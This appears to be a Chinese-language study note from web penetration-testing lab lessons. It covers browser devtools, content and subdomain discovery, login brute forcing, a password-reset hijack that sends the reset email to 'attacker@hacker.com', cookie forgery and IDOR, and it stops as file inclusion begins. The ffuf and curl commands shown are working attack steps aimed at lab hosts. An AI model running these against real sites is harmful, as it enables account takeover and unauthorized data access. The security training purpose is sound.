## 遍历应用程序
> 简介：用浏览器开发者工具手动检查Web应用程序的安全问题。无需任何工具和脚本

本节使用浏览器内置工具手动检查web应用程序的安全问题。自动化安全工具和脚本往往会遗漏许多潜在的漏洞和有用信息

简要分类
- 查看源代码
- 检查器 如何检查页面元素并进行更改以查看通常被阻止的内容
- 调试器 检查并控制页面JS的流程
- 网络 查看页面发出的所有网络请求
### 探索网站
查找网站的交互部分很简单，例如找到登录表单，或手动检查网站的JS，直接来浏览网站，并记下各个页面/区域/功能，并记录下摘要。

例如在一个网站当中/代表主页 /news代表一些新闻之类的内容 需要记录下来

### 查看页面源代码
右击网页点击view source
`<!-- -->`这些是注释，是开发者留下的信息，在新网页开发时可能会有，临时的
指向不同页面的链接用`<a>` 链接在后续的href中

在页面当中观察可能会观察到一些隐藏链接，也可以直接在web上通过js等页面链接到主文件夹当中。某些情况下，备份文件、源码或其他机密信息可能留在这里

如今大多数网站使用的是框架，框架是一组预支代码，开发人员可以轻松的进行开发。查看源码能让我们了解是否正在使用某个框架，还可以了解其具体版本。框架中可能存在公开的漏洞。查看框架网页我们说不定能获取一些内容

### 开发者工具-检查器
浏览器包含开发者工具，可以用于开发并调试应用程序。作为渗透测试人员，我们可以利用这些工具来更好的理解web程序，我们关注的是Inspector,Debugger, Network

CSS、JS和用户交互可能会改变页面的内容和样式，意味着我们需要一种方法来查看此时浏览器窗口中展示的内容

如果有一个类似浮动通知，类似付费墙，直到付费之后才能阅读，这个时候我们可以打开开发者工具，找到对应的DIV对应元素，也就是`display:block`我们尝试修改为none，就恢复了正常，但是仅适用于当前页面。

### 开发者工具-调试器
也就是找到对应的js文件之后，可以在运行过程中增加断点，然后再次刷新网页，就会在断点的地方停止

### 开发者工具-网络
在填写完表单之后点击发送，就可以在network当中发现.msg文件，我们或许能从中发现一些有趣的东西
## 内容发现
这里指的并不是显而易见的网页内容，例如员工使用的页面或者门户，网站的旧版本，备份、配置文件管理面板
三种方式 Manually Automated OSINT 手动 自动 开源情报

### 手动发现-Robots.txt
用于告知搜索引擎哪些页面可以显示在搜索结果中，哪些不可以，或者禁止特定搜索引擎抓取网站，限制某些网站区域不显示在搜索引擎中。

### 手动发现 网站图标
在使用框架构建网站时，安装过程中可能会遗留图标。如果没有将其替换成为自定义图标，这可以让我们了解正在使用的框架。OWASP托管了一个常用框架图标数据库，可以使用数据库来检查目标图标是否与框架相匹配。 
查找网站  [:](https://wiki.owasp.org/index.php/OWASP_favicon_database) [//wiki.owasp.org/index.php/OWASP_favicon_database](https://wiki.owasp.org/index.php/OWASP_favicon_database)

在命令行输入
`curl https://对应的图片地址 | md5sum`
以427e结尾时说明失败，可能需要重试。Windows的Powershell也可以尝试运行
### 手动发现 - Sitemap.xml
与robots不同，sitemap.xml列出了网站所有者希望在搜索引擎中列出的所有文件。这些文件有事可能包含网站中导航较为困难的部分，甚至列出一些当前网站不再使用但后台仍在运行的旧网页

### 手动发现 - HTTP标头
当我们向web服务器发出请求时，服务器会返回各种http标头。这些标头可能包含有用的信息，例如web服务器软件，以及所使用的编程、脚本语言。
~~~ shell
user@machine$ curl http://MACHINE_IP -v 
* Trying MACHINE_IP:80... 
* TCP_NODELAY set 
* Connected to MACHINE_IP (MACHINE_IP) port 80 (#0) 
* GET / HTTP/1.1 > Host: MACHINE_IP 
* User-Agent: curl/7.68.0 > Accept: */* 
* Mark bundle as not supporting multiuse 
* < HTTP/1.1 200 OK < Server: nginx/1.18.0 (Ubuntu) 
* < X-Powered-By: PHP/7.4.3 
* < Date: Mon, 19 Jul 2021 14:39:09 GMT 
* < Content-Type: text/html; charset=UTF-8 < Transfer-Encoding: chunked 
* < Connection: keep-alive
~~~
我们可以看到 Web 服务器的版本是 NGINX 1.18.0，运行的是PHP 7.4.3 版本。利用这些信息，我们可以找到正在使用的软件的易受攻击版本。尝试对 Web 服务器运行以下 curl 命令，其中-v**开关启用详细模式，这将输出标头**
### 手动发现-框架堆栈
一旦确定了网络的框架，都可以找到该框架的网站，从那里可以了解更多关于软件和其他信息，也可能会发现更多内容

### 开源情报-Google黑客攻击/Dorking
利用谷歌的高级搜索引擎，可以筛选自定义内容，例如可以使用**site:** 过滤器筛选出来自特定域名的结果，然后将其与某些搜索词匹配，例如admin(site:www.baidu.com admin)，会返回来自baidu.com且内容中包含单词admin的结果，也可以组合使用多个过滤器

| 筛选       | 例子             | 描述              |
| -------- | -------------- | --------------- |
| site     | site:baidu.com | 返回来自指定网站地址的结果   |
| inurl    | inurl:admin    | 返回URL中包含指定单词的结果 |
| filetype | filetype:pdf   | 返回具有特定文件拓展名的结果  |
| intitle  | intitle:admin  | 返回标题中包含制定单词的结果  |
### 开源情报-Wappalyzer
Wappalyzer(https://www.wappalyzer.com/)是一个在线工具和浏览器拓展，可帮助识别网站使用的技术，例如框架，内容管理系统，支付处理器等，甚至可以找到版本号

### 开源情报-Wayback Machine
Wayback Machine(https://archive.org/web/)是一个网站历史档案库，其历史可以追溯到90年代末。您可以搜索某个域名，它会显示该服务抓取该网页并保存内容的所有时间。这项服务可以帮助发现当前网站上可能仍在活跃的旧页面

### 开源情报-Github
Git是一个版本控制系统 Github是互联网上的Git托管版本，存储库可以设为私有或公有，并具有各种访问控制。可以使用Github的搜索查找公司名称或网站名称，以尝试找到目标库，找到后即可访问源代码和密码

### 自动发现
自动化是因为包含数百千万个对服务器的请求，会检查网站上是否存在某个文件或者目录，从而使我们能够访问未知的资源。此过程通常使用名为词表的资源来实现
#### 什么是词表
词表只是包含常用单词列表的文本文件；可以涵盖许多不同的用例。例如密码单词表会包含最常用的密码，而我们查找的是内容，因此需要一个包含最常用目录和文件名的列表。

#### 自动化工具
ffuf dirb Gobuster
使用方法
~~~ shell
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://MACHINE_IP/FUZZ
~~~
dirb
~~~ shell
dirb http://MACHINE_IP/ /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
~~~
Gobuster
~~~
gobuster dir --url http://MACHINE_IP/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
~~~

## 子域名枚举
### 介绍
子域名枚举是查找有效子域名的过程，为了扩大攻击面，尝试发现更多潜在的漏洞点
三种不同的子域名枚举方法：暴力破解、OSINT(开源情报)和虚拟主机
即Brute  Force OSINT Virtual Host
### 开源情报-SSL/TLS证书
当CA(Certificate Authority)为域名创建SSL(Secure Socket Layer)/TLS(Transport Layer Security)证书时，CA会参与所谓的证书透明度(Certificate Transparency)日志。这些日志记录了为域名创建的每个证书，可供公开访问。证书透明度日志的目的是阻止恶意和意外生成的证书被使用。可以利用这项服务来发现属于某个域名的子域名，像https://crt.sh这样的网站提供了一个可搜索的整数数据库，显示当前和历史结果

### 开源情报-搜索引擎
搜索引擎包含数万亿个指向超过十亿个网站的链接，这些链接是寻找新子域名的绝佳资源。使用谷歌网站上的高级搜索方法可以缩小结果搜索范围。

### DNS暴力破解
暴力DNS枚举是一种从预定义的常用子域名列表中尝试数十数百数千个不同子域名的方法。此方法需要大量请求，我们使用工具将其自动化以加快过程。
例如`dnsrecon`
`dnsrecon -t brt -d acmeitsupport.thm//网站名`

### 开源情报-Sublist3r
为加快OSINT子域名发现的过程，我们可以借助sublist3r等工具自动执行上述方法
如
```
./sublist3r.py -d acmeitsupport.thm
```

### 虚拟主机
某些子域名并非总是托管在可公开访问的DNS结果中，例如Web应用程序或管理门户的开发版本。DNS记录可以保存在私有DNS服务器上，或记录在开发人员计算机上的==/etc/hosts==文件，Windows多为==c:\windows\system32\drivers\etc\hosts文件==中，该文件将域名映射到IP地址，完成DNS操作

由于Web服务器可以在客户端请求网站时，从一台服务器托管多个网站，因此服务器可以通过Host头信息了解客户端想要访问哪个网站，我们可以利用这个Host头信息，对其进行修改并监控响应，看看是否发现了新的网站

与DNS Bruteforce一样，我们可以通过使用常用子域名的单词列表来自动化此过程

~~~
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://MACHINE_IP
~~~
-w 代表 要使用的单词列表 -H 用于添加/编辑标头，在子域名通常所在的位置添加了FUZZ关键字，在此处尝试列表中的所有选项

上述命令始终会生成有效结果，因此需要过滤输出，将页面大小结果与-fs结合使用实现此目的。
在其后添加-fs 上述中size出现最多的数值即可

## 身份验证绕过
简介：学习绕过、破解、或攻破网站身份验证的各种方法。这些漏洞可能是最严重的漏洞之一，通常会导致个人数据泄露

### 用户名枚举
查找身份验证漏洞时，有效的方式是创建一个有效用户名列表。
再使用ffuf列表来检查是否存在匹配项
```
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/signup -mr "username already exists"
```
-w 选择了计算机上包含要检查是否存在用户名列表的文件位置。
-X 指定了请求方法 这是个GET请求，但例子中是POST
-d 指定了要发送的数据。例子中有username、password、和cpassword 用户名的值设为FUZZ。表示将单词表中的内容插入到请求中的哪个位置
-H 用于向请求添加额外的标头，`Content-Type`以便web服务器知道我们正在发送表单数据。
-u指定了发出请求的url
-mr是我们在页面上寻找的文本，以验证是否找到了有效的用户名

### 暴力破解
上一个任务当中输出的名字我们新建一个文件夹然后输入
暴力攻击是一种自动化过程，尝试使用常用密码列表来攻击单个用户名。
```
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/login -fc 200
```
W1代表有效用户名列表 W2代表要尝试的密码列表 多个单词表使用-W参数指定，以逗号分隔。为获得正相匹配，我们使用`-fc`参数来检查除200之外的HTTP状态代码

### 逻辑缺陷
应用程序的典型逻辑路径被黑客绕过、规避或操纵。网站的任何部分都可能存在逻辑缺陷

示例代码
~~~ PHP
if(url.substr(0,6)=== '/admin') {
	#code to check user is an admin
} else {
	#view Page
}
~~~

由于使用了三个等号，所以会在字符串中寻找完全匹配，包括相同字母大小写。存在逻辑缺陷，未经身份验证的用户请求adMin时，不会进行权限检查，也不会显示页面，从而完全绕过身份验证检查
#### 缺陷实践
重置密码功能 例如输入一个电子邮件地址`robert@acmeitsupport.thm`然后输入关联用户名
此项需要知道用户名和邮件 密码链接会发送到账户所有者的电子邮件地址
需要运行以下两个curl请求，在重置电子邮件流程第二步中，在POST字段提交到Web服务器，电子邮件在查询字符串请求中作为GET字段发送
让我们使用curl工具手动向Web服务器发送请求
```
user@tryhackme$ curl 'http://MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'
```
使用==-H==标志为请求添加额外的标头。在本例中，我们将设置为`Content-Type`,`application/x-www-from-urlencoded`以便Web服务器知道我们正在发送表单数据，以便它能正确理解我们的请求

在程序中，使用查询字符串检索用户账户，但稍后在应用程序逻辑中，使用PHP变量中的数据发送密码重置电子邮件``$_REQUEST`

PHP变量`$_REQUEST`是一个数组，包含从查询字符串和POST数据接收的数据。如果查询字符串和POST数据使用相同的键名，则此变量的应用程序会优先处理POST的数据字段而不是查询字符串。因此如果我们在POST表单中添加另一个参数，就可以控制密码重置电子邮件的发送目的地

```
user@tryhackme$ curl 'http://MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'
```
下一步，需要创建一个账户，这样就获得了用于创建工单的电子邮件地址
然后重新运行上述代码，这个时候就会让我们的邮箱收到一条工单，包含一个可以使用Robert身份登录的链接

### Cookie篡改
在在线会话期间检查和编辑Web服务器设置的Cookie会造成多种后果，例如未经身份验证的访问、访问其他用户的账户或提升权限。
#### 纯文本
某些Cookie内容可以是纯文本，作用显而易见，例如这些事成功登录后设置的Cookie
```
Set-Cookie: logged_in=true;Max-Age=3600; Path=/
Set-Cookie:admin=false;Max-Age=3600; Path=/
```
logged_in的似乎控制着用户当前是否登录，另一个控制着访问者时候有管理权限，如果我们能更改Cookie的内容并发送请求，就能更改我们的权限

首先从请求页面开始
```
curl http://MACHINE_IP/cookie-test
```
返回未登录的消息
现在我们发送另一个请求，将logged_in cookie 设置为True,将admin cookie设置为false
```
curl -H "Cookie: logged_in=true; admin=false" http://MACHINE_IP/cookie-test
```
我们收到消息，以用户身份登录
最后我们发送最后一个请求，将logged_in和admin cookie都设置为true
```
curl -H "Cookie: logged_in=true; admin=true" http://MACHINE_IP/cookie-test
```
#### Hash
有时，Cookie看起来像一长串随机字符，被称为哈希值，是原始文本的不可逆表示

| 原始字符串 |  哈希方法   |                                                                输出                                                                |
| :---: | :-----: | :------------------------------------------------------------------------------------------------------------------------------: |
|   1   |   md5   |                                                 c4ca4238a0b923820dcc509a6f75849b                                                 |
|   1   | SHA-256 |                                 6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b                                 |
|   1   | SHA-512 | 4dff4ea340f0a823f15d3f4f01ab62eae0e5da579ccb851f8db9dfe84c58b2b37b89903a740e1ee172da793a6e79d560e5f7f9bd058a12a280433ed6fa46510a |
|   1   |  sha1   |                                             356a192b7913b04c54574d18c28d46e6395428ab                                             |

相同的输入可能因为方法不同得到不同的输出 即使哈希不可逆，每次都会产生相同的输出，在https://crackstation.net中保存着数十亿个哈希及其原始字符串的数据库

#### 编码
同样创建随机的文本字符串，编码可逆这种编码使我们能够将二进制数据转换为人类可读的文本，从而可以轻松的通过仅支持纯文本ASCII字符的介质进行传输
常见的包括 base32 base64
```
Set-Cookie:session=eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ= =;Max-Age=3600;Path=/
```
该字符串解码后的值为 id=1 admin：false 然后可以将其重新编码为64编码，然后将admin设置为true，就可以获得管理员访问权限了
## IDOR
> Title：了解如何查找和利用Web应用程序中的IDOR漏洞，从而可以访问不该拥有的数据
### 什么是IDOR
IDOR(Insecure Direct Object Reference)不安全的直接对象引用，是一种访问控制漏洞。
当Web服务器接受用户提供的输入以检索对象时，可能会出现这种类型的漏洞，对输入数据过于信任，并且服务器端没有验证请求的对象是否属于请求它的用户
### IDOR示例
刚注册好的服务，想要更改个人信息，链接是xxx./profile?user_id=1305，好奇心的趋势下想要改一下id试试，改成1000之后发现了其他人的信息！这就是一个IDOR漏洞
网站要设置一个检查机制，以确认用户信息确实属于登录并提交请求的用户
### 在编码ID中查找IDOR
#### 编码ID
当通过POST、查询字符串或Cookie在页面之间传递数据时，Web开发者通常会先获取原始数据并对其进行编码。编码确保接收方Web服务器能够理解其内容。编码先将二进制数据转换为ASCII字符串，常见的是BASE64，很容易识别，可以使用网站解码，然后编辑数据重新编码，最后重新提交请求，查看响应中是否有变化

### 在散列ID中查找IDOR
哈希ID
哈希ID的处理比编码ID复杂一些，但可能遵循一些可预测的模式，例如整数值的哈希版本。例如，如果使用md5算法，id123会变成202cb962ac59075b964b07152d234b70
### 在不可预测的ID中查找IDOR
如果使用上述方法无法检测到ID，那么一个很好地方法是创建两个账户并交换它们的ID，如果仍然使用其他账户登录的情况下，可以使用其他用户的ID号查看它们的内容，说明发现了一个有效的IDOR漏洞

### IDOR位于何处
易受攻击的端点可能并不总是在地址栏中看到的内容。可能是浏览器通过AJAX请求加载的内容，也可能是在JS文件中发现引用的内容

有时，端点可能包含一些未引用的参数，这些参数可能在开发过程中派上用场，并被推送到到生产环境。例如，可能会注意到对/user/details的调用显示了用户信息。但是通过一种成为参数挖掘的攻击，会发现一个名为user_id的参数，可以使用它来显示其他用户的信息，例如/user/details?/user_id=123

### 一个实际的IDOR示例
在账户部分，可以更改信息，例如用户名、电子邮件地址和密码。用户名和电子邮件字段已经预先填写了
打开开发者工具->网络 刷新界面
看到一个对路径为/api/v1/customer?id=的端点调用{user_id}

此页面以JSON格式返回用户ID、用户名和电子邮件地址。从路径可以看出，显示的用户信息取自查询字符串的id参数

可以尝试修改id
## 文件包含
包括本地文件包含、远程文件包含和目录遍历。
在某些情况下，Web应用程序会被编写为通过参数请求访问给定系统上的文件，包括图像，静态文本等。参数是附加到URL的查询参数字符串，可用于检索数据或根据用户执行操作
